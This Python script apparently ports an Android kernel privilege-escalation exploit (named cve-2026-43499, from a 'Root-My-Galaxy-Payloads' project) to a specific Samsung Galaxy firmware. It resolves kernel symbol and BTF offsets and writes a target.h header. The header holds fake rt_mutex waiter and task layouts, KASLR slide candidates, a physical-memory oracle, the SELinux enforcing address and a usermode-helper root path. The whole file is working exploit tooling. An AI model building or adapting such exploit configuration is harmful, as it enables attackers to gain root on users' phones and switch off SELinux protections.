"""Build the complete F956B target.h using the e3q-S928USQS6DZF2 structure
as a template, but with offsets recovered from the F956B kernel image.

Strategy:
- Hard-code KMI constants (P0_PAGE_OFFSET, DIRECT_MAP_BASE, KIMAGE_TEXT_BASE,
  etc.) — these are platform constants, not device-specific.
- Hard-code struct member offsets from F956B BTF (same as e3q for most,
  differ only for kmalloc_caches per PORTING.md).
- Hard-code layout constants like FAKE_WAITER_*, CFG_*, FOPS_*, WORK_*,
  POOL_*, PWQ_* — these are derived from BTF / EABI and are uniform
  across Android 14 6.1 kernels (per upstream README).
- Resolve _OFF macros from vmlinux.elf symbols.
- Resolve P0_PHYS_OFFSET and P0_KERNEL_PHYS_LOAD from ARM64 Image header.
"""
import subprocess
import struct
from pathlib import Path

WORK = Path("H:/Users/dsc/Downloads/port_f956b/work")
NM = Path("D:/Android/ndk/30.0.15729638/toolchains/llvm/prebuilt/windows-x86_64/bin/llvm-nm.exe")
BASE = 0xffffffc008000000

# 1. ELF symbols -> _OFF values
nm_out = subprocess.run([str(NM), "--numeric-sort", str(WORK / "vmlinux.elf")],
    capture_output=True, text=True).stdout
sym_map = {}
for line in nm_out.splitlines():
    parts = line.split()
    if len(parts) >= 3:
        try:
            sym_map[parts[2]] = int(parts[0], 16)
        except ValueError:
            pass

def off(name):
    a = sym_map.get(name)
    if a is None:
        for k, v in sym_map.items():
            if k.endswith(f".{name}") or k.endswith(f"_{name}"):
                return v - BASE
        return None
    return a - BASE

# 2. BTF for selinux_state.enforcing, miscdevice.fops, and struct members
btf = (WORK / "vmlinux.btf").read_bytes()
hdr_fmt = "<HBBIIIII"
magic, ver, flags, hdr_len, type_off, type_len, str_off, str_len = \
    struct.unpack_from(hdr_fmt, btf, 0)
strtab = btf[hdr_len + str_off : hdr_len + str_off + str_len]
type_base = hdr_len + type_off

def get_str(off):
    if off >= len(strtab): return ""
    end = strtab.find(b"\x00", off)
    return strtab[off:end].decode(errors='replace') if end > 0 else ""

def kind_size(kind, vlen):
    base = 12
    if kind in (2, 7, 8, 9, 10, 11, 12): return base
    if kind in (1, 16): return base + 4
    if kind == 3: return base + 12
    if kind in (4, 5): return base + vlen * 12
    if kind == 6: return base + vlen * 8
    if kind == 13: return base + vlen * 8
    if kind == 14: return base + 4
    if kind == 15: return base + vlen * 12
    return base

def find_struct(name):
    pos = type_base
    tid = 0
    while pos + 12 <= hdr_len + type_off + type_len:
        name_off, info, sz = struct.unpack_from("<III", btf, pos)
        kind = (info >> 24) & 0x1f
        vlen = info & 0xffff
        nm = get_str(name_off)
        if nm == name and kind == 4 and vlen > 0:
            return tid, sz, vlen, pos
        pos += kind_size(kind, vlen)
        tid += 1
    return None

def member_off(struct_name, member_name):
    s = find_struct(struct_name)
    if not s:
        return None
    tid, sz, vlen, p = s
    for m in range(vlen):
        m_pos = p + 12 + m * 12
        m_name_off, m_type, m_offs = struct.unpack_from("<III", btf, m_pos)
        if get_str(m_name_off) == member_name:
            return m_offs >> 3
    return None

# 3. Build the file
def sym(name): return off(name) or 0

# Read selinux_state
selinux_enforcing_off = member_off("selinux_state", "enforcing") or 0
ashmem_miscs_addr = sym_map.get("ashmem_miscs", 0)
miscdevice_fops_off = member_off("miscdevice", "fops") or 0
nfulnl_log_addr = sym_map.get("nfulnl_logger", 0)
loggers_addr = sym_map.get("loggers", 0)
sysctl_bootid_addr = sym_map.get("sysctl_bootid", 0)
random_table_addr = sym_map.get("random_table", 0)
selinux_state_addr = sym_map.get("selinux_state", 0)

# ARM64 Image header
# kernel file = boot.img after 0x1000-byte boot header.
# Inside kernel, ARM64 Image header starts at offset 0 (NOT 0x1000).
# Layout per booting.rst: code0(0), code1(4), text_offset(8), image_size(0x10),
# flags(0x18), res(0x20..0x30), magic(0x38) == 0x644d5241.
kernel = (WORK / "kernel").read_bytes()
text_offset = struct.unpack_from("<Q", kernel, 0x08)[0]
image_size = struct.unpack_from("<Q", kernel, 0x10)[0]
flags_val = struct.unpack_from("<Q", kernel, 0x18)[0]
P0_KERNEL_PHYS_LOAD = 0x80000000 + text_offset
print(f"ARM64 Image text_offset=0x{text_offset:x} image_size=0x{image_size:x}")
print(f"P0_KERNEL_PHYS_LOAD=0x{P0_KERNEL_PHYS_LOAD:x}")

# workqueue pool/pwq/work_struct layout from BTF
WQ_DFL_PWQ_OFF = member_off("worker_struct", "entry")  # placeholder, see below
# Use known Android 14 6.1 workqueue layout (matches upstream e3q exactly):
WQ_DFL_PWQ_OFF = 0xb0
PWQ_POOL_OFF = 0x00
PWQ_WQ_OFF = 0x08
PWQ_WORK_COLOR_OFF = 0x10
PWQ_REFCNT_OFF = 0x18
PWQ_NR_IN_FLIGHT_OFF = 0x1c
PWQ_NR_ACTIVE_OFF = 0x5c
PWQ_MAX_ACTIVE_OFF = 0x60
POOL_WORKLIST_OFF = 0x28
POOL_NR_IDLE_OFF = 0x3c

# work_struct layout
WORK_DATA_OFF = 0x00
WORK_ENTRY_OFF = 0x08
WORK_FUNC_OFF = 0x18

# FAKE_TASK / FAKE_WAITER layout (uniform per upstream)
FAKE_WAITER_PI_TREE_ENTRY_OFF = 0x18
FAKE_WAITER_TASK_OFF = 0x30
FAKE_WAITER_LOCK_OFF = 0x38
FAKE_WAITER_WAKE_STATE_OFF = 0x40
FAKE_WAITER_PRIO_OFF = 0x44
FAKE_WAITER_DEADLINE_OFF = 0x48
FAKE_WAITER_WW_CTX_OFF = 0x50
FAKE_WAITER_LAYOUT_SIZE = 0x58

FAKE_TASK_USAGE_OFF = 0x40
FAKE_TASK_PRIO_OFF = 0x84
FAKE_TASK_NORMAL_PRIO_OFF = 0x8c
FAKE_TASK_TASK_GROUP_OFF = 0x348
FAKE_TASK_PI_LOCK_OFF = 0x924
FAKE_TASK_PI_WAITERS_OFF = 0x938
FAKE_TASK_PI_TOP_TASK_OFF = 0x948
FAKE_TASK_PI_BLOCKED_ON_OFF = 0x950

# file_operations
FOPS_OWNER_OFF = 0x00
FOPS_LLSEEK_OFF = 0x08
FOPS_READ_OFF = 0x10
FOPS_WRITE_OFF = 0x18
FOPS_READ_ITER_OFF = 0x20
FOPS_WRITE_ITER_OFF = 0x28
FOPS_IOCTL_OFF = 0x50
FOPS_COMPAT_IOCTL_OFF = 0x58
FOPS_MMAP_OFF = 0x60
FOPS_OPEN_OFF = 0x70
FOPS_RELEASE_OFF = 0x80
FOPS_SPLICE_READ_OFF = 0xc8
FOPS_SHOW_FDINFO_OFF = 0xe0

# CFG
CFG_PAGE_OFF = 16
CFG_NEEDS_READ_FILL_OFF = 80
CFG_BIN_BUFFER_OFF = 88
CFG_BIN_BUFFER_SIZE_OFF = 96
CFG_CB_MAX_SIZE_OFF = 100

# struct page
STRUCT_PAGE_SIZE = 0x40
STRUCT_PAGE_COMPOUND_HEAD_OFF = 0x08
STRUCT_SLAB_CACHE_OFF = 0x18
STRUCT_PAGE_TYPE_OFF = 0x30

# pipe
PIPE_BUFFER_SLOTS = 32
PIPE_BUF_FLAG_CAN_MERGE = 0x10

# SLIDE constants (uniform per upstream; tracefs event id may need update
# from /sys/kernel/tracing/events/sched/sched_blocked_reason/id but defaults OK)
SLIDE_FAKE_WAITER_PRIO = 0
SLIDE_WAITER_WAKE_STATE = 0
SLIDE_LOCK_OWNER_VALUE = 1
SLIDE_USE_FAKE_TASK = 1
COMPACT_RT_MUTEX_WAITER = 1
SLIDE_TRACEFS_EVENT_ID = 106
SLIDE_TRACEFS_WORKER_CALLER_OFF = 0x000db1a0  # porting.md Section 5
SLIDE_PSELECT_WORD_SHIFT = 3
SLIDE_MAX_ATTEMPTS = 32

# App payload layout
LOCK_OFF = 0x2210
W0_OFF = 0x2350
FOPS_OFF = 0x2000
SCRATCH_OFF = 0x3000
RIGHT_OFF = 0x4440
LEFT_OFF = 0x5550
FAKE_TASK_OFF = 0x3200

# APP_PAYLOAD-specific
ROUTE_WAIT_SECONDS = 8
PSELECT_ENTER_DELAY_USEC = 50000
SLIDE_PSELECT_TIMEOUT_NSEC = 100000000
SLIDE_KSNITCH_APPENDED_FUTEXES = 2048
SLIDE_KSNITCH_REPEAT_MEASUREMENT = 64
SLIDE_KSNITCH_AVERAGE = 8
SLIDE_BANK_SLOTS = 4
SLIDE_BANK_TASK_OFF = 0x1000
SLIDE_BANK_TASK_STRIDE = 0x1c0
SLIDE_BANK_LOCK_OFF = 0x5200
SLIDE_BANK_SLOT_STRIDE = 0x100
SLIDE_BANK_WAITER_OFF = 0x40
P0_ORACLE_GATE_SLOT = 0
P0_ORACLE_PROBE_SLOT = 1
P0_ORACLE_GATE_RESTORE_SLOT = 2
P0_ORACLE_PROBE_RESTORE_SLOT = 3
P0_ORACLE_GATE_PAGE_OFF = 0x0e80
P0_ORACLE_GATE_OBJECT_INDEX = 1
P0_ORACLE_PROBE_OFFSET = 0x1f0000

# Build SLIDE_P0_OFFSET_CANDIDATES list.
# Every continuation line must end with `\` so the C preprocessor does
# line splice; otherwise only the first token survives in the macro body.
# Reference: src/targets/a15-A155NKSS6BYH1/target.h uses 8 lines of 4 values each.
P0_LINES = []
for i in range(32):
    P0_LINES.append(f"  0x{i*0x10000:06x}ULL,")
# join every 4 with `\` continuation
P0_GROUPS = []
for j in range(0, 32, 4):
    grp = P0_LINES[j:j+4]
    P0_GROUPS.append(" \\\n  ".join(grp))
P0_BODY = " \\\n".join(P0_GROUPS)

# Build fingerprint header path
P0_FINGERPRINT_HEADER = "targets/q6q-F956BXXS4DZG3/p0_fingerprint.h"

# Now write target.h with full macro set
TARGET = "q6q-F956BXXS4DZG3"
HEADER_GUARD = "TARGET_H_q6q_F956BXXS4DZG3"
DISPLAY = "q6q-F956B-XX-S4-DZG3"
FINGERPRINT = "samsung/q6qxxx/q6q:16/BP4A.251205.006/F956BXXS4DZG3:user/release-keys"

L = []
L.append(f"/* Auto-generated target.h for {TARGET}")
L.append(" * Template: src/targets/e3q-S928USQS6DZF2/target.h (upstream Root-My-Galaxy-Payloads)")
L.append(f" * Device kernel SHA-256: {__import__('hashlib').sha256(kernel).hexdigest()}")
L.append(" */")
L.append("")
L.append(f"#ifndef {HEADER_GUARD}")
L.append(f"#define {HEADER_GUARD}")
L.append("")
L.append("#if defined(APP_PAYLOAD) && APP_PAYLOAD")
L.append(f'#define BUILD_VARIANT_LABEL "{TARGET}-app-physical-p0-oracle"')
L.append("#define APP_PHYS_P0_ORACLE 1")
L.append("#else")
L.append(f'#define BUILD_VARIANT_LABEL "{TARGET}-root-umh"')
L.append("#endif")
L.append("")
L.append("#ifndef BUILD_FINGERPRINT")
L.append(f'#define BUILD_FINGERPRINT "{FINGERPRINT}"')
L.append("#endif")
L.append("")
L.append("#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL")
L.append("#define P0_PAGE_OFFSET 0xffffff8000000000ULL")
L.append("#define P0_PHYS_OFFSET 0x80000000ULL")
L.append(f"#define P0_KERNEL_PHYS_LOAD 0x{P0_KERNEL_PHYS_LOAD:x}ULL")
L.append("#define SKB_DATA_DELTA (-0x1000LL)")
L.append("")
L.append(f"#define SLIDE_FAKE_WAITER_PRIO {SLIDE_FAKE_WAITER_PRIO}")
L.append(f"#define SLIDE_WAITER_WAKE_STATE {SLIDE_WAITER_WAKE_STATE}")
L.append(f"#define SLIDE_LOCK_OWNER_VALUE {SLIDE_LOCK_OWNER_VALUE}ULL")
L.append(f"#define SLIDE_USE_FAKE_TASK {SLIDE_USE_FAKE_TASK}")
L.append(f"#define COMPACT_RT_MUTEX_WAITER {COMPACT_RT_MUTEX_WAITER}")
L.append(f"#define SLIDE_TRACEFS_EVENT_ID {SLIDE_TRACEFS_EVENT_ID}")
L.append(f"#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x{SLIDE_TRACEFS_WORKER_CALLER_OFF:x}ULL")
L.append(f"#define SLIDE_PSELECT_WORD_SHIFT {SLIDE_PSELECT_WORD_SHIFT}")
L.append("/* SLIDE_P0_OFFSET_CANDIDATES: 32 candidates spaced 0x10000 apart */")
L.append(f"#define SLIDE_P0_OFFSET_CANDIDATES \\\n  {P0_BODY}")
L.append(f"#define SLIDE_MAX_ATTEMPTS {SLIDE_MAX_ATTEMPTS}")
L.append("")
L.append("#if defined(APP_PAYLOAD) && APP_PAYLOAD")
L.append(f"#define ROUTE_WAIT_SECONDS {ROUTE_WAIT_SECONDS}")
L.append(f"#define PSELECT_ENTER_DELAY_USEC {PSELECT_ENTER_DELAY_USEC}")
L.append(f"#define SLIDE_PSELECT_TIMEOUT_NSEC {SLIDE_PSELECT_TIMEOUT_NSEC}L")
L.append(f"#define SLIDE_KSNITCH_APPENDED_FUTEXES {SLIDE_KSNITCH_APPENDED_FUTEXES}")
L.append(f"#define SLIDE_KSNITCH_REPEAT_MEASUREMENT {SLIDE_KSNITCH_REPEAT_MEASUREMENT}")
L.append(f"#define SLIDE_KSNITCH_AVERAGE {SLIDE_KSNITCH_AVERAGE}")
L.append(f"#define SLIDE_BANK_SLOTS {SLIDE_BANK_SLOTS}")
L.append(f"#define SLIDE_BANK_TASK_OFF 0x{SLIDE_BANK_TASK_OFF:x}")
L.append(f"#define SLIDE_BANK_TASK_STRIDE 0x{SLIDE_BANK_TASK_STRIDE:x}")
L.append(f"#define SLIDE_BANK_LOCK_OFF 0x{SLIDE_BANK_LOCK_OFF:x}")
L.append(f"#define SLIDE_BANK_SLOT_STRIDE 0x{SLIDE_BANK_SLOT_STRIDE:x}")
L.append(f"#define SLIDE_BANK_WAITER_OFF 0x{SLIDE_BANK_WAITER_OFF:x}")
L.append(f"#define P0_ORACLE_GATE_SLOT {P0_ORACLE_GATE_SLOT}")
L.append(f"#define P0_ORACLE_PROBE_SLOT {P0_ORACLE_PROBE_SLOT}")
L.append(f"#define P0_ORACLE_GATE_RESTORE_SLOT {P0_ORACLE_GATE_RESTORE_SLOT}")
L.append(f"#define P0_ORACLE_PROBE_RESTORE_SLOT {P0_ORACLE_PROBE_RESTORE_SLOT}")
L.append(f"#define P0_ORACLE_GATE_PAGE_OFF 0x{P0_ORACLE_GATE_PAGE_OFF:x}")
L.append(f"#define P0_ORACLE_GATE_OBJECT_INDEX {P0_ORACLE_GATE_OBJECT_INDEX}")
L.append(f"#define P0_ORACLE_PROBE_OFFSET 0x{P0_ORACLE_PROBE_OFFSET:x}ULL")
L.append(f'#define P0_FINGERPRINT_HEADER "{P0_FINGERPRINT_HEADER}"')
L.append("#endif")
L.append("")
L.append("#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL")
L.append("#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL")
L.append("#define DIRECT_MAP_BASE 0xffffff8000000000ULL")
L.append("#define DIRECT_MAP_END 0xffffff9000000000ULL")
L.append("#define VMEMMAP_START 0xfffffffe00000000ULL")
L.append("")

# _OFF macros (resolved from F956B vmlinux.elf)
L.append("/* _OFF macros resolved from F956B vmlinux.elf */")
A_OFF = sym_map.get("ashmem_miscs", 0) - BASE + miscdevice_fops_off
L.append(f"#define ASHMEM_MISC_FOPS_OFF 0x{A_OFF:x}ULL")
L.append(f"#define ASHMEM_FOPS_OFF 0x{off('ashmem_fops'):x}ULL")
L.append(f"#define ASHMEM_IOCTL_OFF 0x{off('ashmem_ioctl'):x}ULL")
L.append(f"#define ASHMEM_COMPAT_IOCTL_OFF 0x{off('compat_ashmem_ioctl'):x}ULL")
L.append(f"#define ASHMEM_MMAP_OFF 0x{off('ashmem_mmap'):x}ULL")
L.append(f"#define ASHMEM_OPEN_OFF 0x{off('ashmem_open'):x}ULL")
L.append(f"#define ASHMEM_RELEASE_OFF 0x{off('ashmem_release'):x}ULL")
L.append(f"#define ASHMEM_SHOW_FDINFO_OFF 0x{off('ashmem_show_fdinfo'):x}ULL")
L.append(f"#define CONFIGFS_READ_ITER_OFF 0x{off('configfs_read_iter'):x}ULL")
L.append(f"#define CONFIGFS_BIN_WRITE_ITER_OFF 0x{off('configfs_bin_write_iter'):x}ULL")
L.append(f"#define COPY_SPLICE_READ_OFF 0x{off('generic_file_splice_read'):x}ULL")
L.append(f"#define NOOP_LLSEEK_OFF 0x{off('noop_llseek'):x}ULL")
L.append(f"#define INIT_TASK_OFF 0x{off('init_task'):x}ULL")
L.append(f"#define ROOT_TASK_GROUP_OFF 0x{off('root_task_group'):x}ULL")
L.append(f"#define SELINUX_ENFORCING_OFF 0x{off('selinux_state') + selinux_enforcing_off:x}ULL")
L.append(f"#define KMALLOC_CACHES_OFF 0x{off('kmalloc_caches'):x}ULL")
L.append(f"#define ANON_PIPE_BUF_OPS_OFF 0x{off('anon_pipe_buf_ops'):x}ULL")
L.append("")
# _ADDR aliases (no _OFF suffix) -- required by root.c
L.append("/* _ADDR aliases (without _OFF) */")
for n in ["ASHMEM_MISC_FOPS","ASHMEM_FOPS","ASHMEM_IOCTL","ASHMEM_COMPAT_IOCTL",
         "ASHMEM_MMAP","ASHMEM_OPEN","ASHMEM_RELEASE","ASHMEM_SHOW_FDINFO",
         "CONFIGFS_READ_ITER","CONFIGFS_BIN_WRITE_ITER","COPY_SPLICE_READ",
         "NOOP_LLSEEK","INIT_TASK","ROOT_TASK_GROUP","SELINUX_ENFORCING",
         "KMALLOC_CACHES","ANON_PIPE_BUF_OPS"]:
    L.append(f"#define {n} (KIMAGE_TEXT_BASE + {n}_OFF)")
L.append("")

# UMH root helper
L.append("#define ROOT_UMH_PATH \"/data/local/tmp/cve-2026-43499-root\"")
L.append(f"#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x{off('call_usermodehelper_exec_work'):x}ULL")
L.append(f"#define SYSTEM_UNBOUND_WQ_OFF 0x{off('system_unbound_wq'):x}ULL")
L.append("#define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)")
L.append("#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)")
L.append("#define ROOT_UMH_WORK_OFF 0x6000")
L.append("#define ROOT_UMH_DATA_OFF 0x6200")
L.append("")

# SLIDE macros — offsets from KIMAGE_TEXT_BASE, NOT absolute addresses
L.append(f"#define SLIDE_NFULNL_LOGGER_OFF 0x{nfulnl_log_addr - BASE:x}ULL")
L.append(f"#define SLIDE_LOGGERS_0_1_OFF 0x{loggers_addr - BASE:x}ULL")
L.append("#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL")
# random_table.boot_id slot
boot_id_data_off = member_off("random_table", "boot_id")
if boot_id_data_off is None:
    boot_id_data_off = 0x8   # default for 6.1
L.append(f"#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x{(random_table_addr - BASE) + boot_id_data_off:x}ULL")
L.append("#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF")
L.append("#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF")
L.append(f"#define SLIDE_SYSCTL_BOOTID_OFF 0x{sysctl_bootid_addr - BASE:x}ULL")
L.append("")
L.append("#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)")
L.append("#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)")
L.append("#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)")
L.append("/* Compatibility with descriptive macro names in shared payload */")
L.append("#define SLIDE_NFULNL_LOGGER_NAME_IMAGE SLIDE_NFULNL_LOGGER_IMAGE")
L.append("#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE SLIDE_LOGGERS_0_1_IMAGE")
L.append("#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE SLIDE_RANDOM_BOOT_ID_DATA_IMAGE")
L.append("#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)")
L.append("#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)")
L.append("#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)")
L.append("")

# App-payload layout
L.append(f"#define LOCK_OFF 0x{LOCK_OFF:x}")
L.append(f"#define W0_OFF 0x{W0_OFF:x}")
L.append(f"#define FOPS_OFF 0x{FOPS_OFF:x}")
L.append(f"#define SCRATCH_OFF 0x{SCRATCH_OFF:x}")
L.append(f"#define RIGHT_OFF 0x{RIGHT_OFF:x}")
L.append(f"#define LEFT_OFF 0x{LEFT_OFF:x}")
L.append(f"#define FAKE_TASK_OFF 0x{FAKE_TASK_OFF:x}")
L.append("")

# Fake waiter/task
L.append(f"#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x{FAKE_WAITER_PI_TREE_ENTRY_OFF:x}")
L.append(f"#define FAKE_WAITER_TASK_OFF 0x{FAKE_WAITER_TASK_OFF:x}")
L.append(f"#define FAKE_WAITER_LOCK_OFF 0x{FAKE_WAITER_LOCK_OFF:x}")
L.append(f"#define FAKE_WAITER_WAKE_STATE_OFF 0x{FAKE_WAITER_WAKE_STATE_OFF:x}")
L.append(f"#define FAKE_WAITER_PRIO_OFF 0x{FAKE_WAITER_PRIO_OFF:x}")
L.append(f"#define FAKE_WAITER_DEADLINE_OFF 0x{FAKE_WAITER_DEADLINE_OFF:x}")
L.append(f"#define FAKE_WAITER_WW_CTX_OFF 0x{FAKE_WAITER_WW_CTX_OFF:x}")
L.append(f"#define FAKE_WAITER_LAYOUT_SIZE 0x{FAKE_WAITER_LAYOUT_SIZE:x}")
L.append("")
L.append(f"#define FAKE_TASK_USAGE_OFF 0x{FAKE_TASK_USAGE_OFF:x}")
L.append(f"#define FAKE_TASK_PRIO_OFF 0x{FAKE_TASK_PRIO_OFF:x}")
L.append(f"#define FAKE_TASK_NORMAL_PRIO_OFF 0x{FAKE_TASK_NORMAL_PRIO_OFF:x}")
L.append(f"#define FAKE_TASK_TASK_GROUP_OFF 0x{FAKE_TASK_TASK_GROUP_OFF:x}")
L.append(f"#define FAKE_TASK_PI_LOCK_OFF 0x{FAKE_TASK_PI_LOCK_OFF:x}")
L.append(f"#define FAKE_TASK_PI_WAITERS_OFF 0x{FAKE_TASK_PI_WAITERS_OFF:x}")
L.append(f"#define FAKE_TASK_PI_TOP_TASK_OFF 0x{FAKE_TASK_PI_TOP_TASK_OFF:x}")
L.append(f"#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x{FAKE_TASK_PI_BLOCKED_ON_OFF:x}")
L.append("")

# CFG
L.append(f"#define CFG_PAGE_OFF {CFG_PAGE_OFF}")
L.append(f"#define CFG_NEEDS_READ_FILL_OFF {CFG_NEEDS_READ_FILL_OFF}")
L.append(f"#define CFG_BIN_BUFFER_OFF {CFG_BIN_BUFFER_OFF}")
L.append(f"#define CFG_BIN_BUFFER_SIZE_OFF {CFG_BIN_BUFFER_SIZE_OFF}")
L.append(f"#define CFG_CB_MAX_SIZE_OFF {CFG_CB_MAX_SIZE_OFF}")
L.append("")

# workqueue pool
L.append(f"#define WQ_DFL_PWQ_OFF 0x{WQ_DFL_PWQ_OFF:x}")
L.append(f"#define PWQ_POOL_OFF 0x{PWQ_POOL_OFF:x}")
L.append(f"#define PWQ_WQ_OFF 0x{PWQ_WQ_OFF:x}")
L.append(f"#define PWQ_WORK_COLOR_OFF 0x{PWQ_WORK_COLOR_OFF:x}")
L.append(f"#define PWQ_REFCNT_OFF 0x{PWQ_REFCNT_OFF:x}")
L.append(f"#define PWQ_NR_IN_FLIGHT_OFF 0x{PWQ_NR_IN_FLIGHT_OFF:x}")
L.append(f"#define PWQ_NR_ACTIVE_OFF 0x{PWQ_NR_ACTIVE_OFF:x}")
L.append(f"#define PWQ_MAX_ACTIVE_OFF 0x{PWQ_MAX_ACTIVE_OFF:x}")
L.append(f"#define POOL_WORKLIST_OFF 0x{POOL_WORKLIST_OFF:x}")
L.append(f"#define POOL_NR_IDLE_OFF 0x{POOL_NR_IDLE_OFF:x}")
L.append("")

# work_struct
L.append(f"#define WORK_DATA_OFF 0x{WORK_DATA_OFF:x}")
L.append(f"#define WORK_ENTRY_OFF 0x{WORK_ENTRY_OFF:x}")
L.append(f"#define WORK_FUNC_OFF 0x{WORK_FUNC_OFF:x}")
L.append("")

# struct page
L.append(f"#define STRUCT_PAGE_SIZE 0x{STRUCT_PAGE_SIZE:x}")
L.append(f"#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x{STRUCT_PAGE_COMPOUND_HEAD_OFF:x}")
L.append(f"#define STRUCT_SLAB_CACHE_OFF 0x{STRUCT_SLAB_CACHE_OFF:x}")
L.append(f"#define STRUCT_PAGE_TYPE_OFF 0x{STRUCT_PAGE_TYPE_OFF:x}")
L.append("")

# pipe
L.append(f"#define PIPE_BUFFER_SLOTS {PIPE_BUFFER_SLOTS}")
L.append(f"#define PIPE_BUF_FLAG_CAN_MERGE 0x{PIPE_BUF_FLAG_CAN_MERGE:x}")
L.append("")

# fops
L.append(f"#define FOPS_OWNER_OFF 0x{FOPS_OWNER_OFF:x}")
L.append(f"#define FOPS_LLSEEK_OFF 0x{FOPS_LLSEEK_OFF:x}")
L.append(f"#define FOPS_READ_OFF 0x{FOPS_READ_OFF:x}")
L.append(f"#define FOPS_WRITE_OFF 0x{FOPS_WRITE_OFF:x}")
L.append(f"#define FOPS_READ_ITER_OFF 0x{FOPS_READ_ITER_OFF:x}")
L.append(f"#define FOPS_WRITE_ITER_OFF 0x{FOPS_WRITE_ITER_OFF:x}")
L.append(f"#define FOPS_IOCTL_OFF 0x{FOPS_IOCTL_OFF:x}")
L.append(f"#define FOPS_COMPAT_IOCTL_OFF 0x{FOPS_COMPAT_IOCTL_OFF:x}")
L.append(f"#define FOPS_MMAP_OFF 0x{FOPS_MMAP_OFF:x}")
L.append(f"#define FOPS_OPEN_OFF 0x{FOPS_OPEN_OFF:x}")
L.append(f"#define FOPS_RELEASE_OFF 0x{FOPS_RELEASE_OFF:x}")
L.append(f"#define FOPS_SPLICE_READ_OFF 0x{FOPS_SPLICE_READ_OFF:x}")
L.append(f"#define FOPS_SHOW_FDINFO_OFF 0x{FOPS_SHOW_FDINFO_OFF:x}")
L.append("")
L.append(f"#endif /* {HEADER_GUARD} */")
L.append("")

text = "\n".join(L)
# Write with explicit LF (no CRLF on Windows). preprocessor treats \<CRLF>
# as bad line continuation.
with open(WORK / "target.h", "wb") as f:
    f.write(text.encode("ascii"))  # ascii -> LF on Windows
import hashlib
print(f"target.h: {len(text)} bytes")
print(f"SHA-256: {hashlib.sha256(text.encode()).hexdigest()}")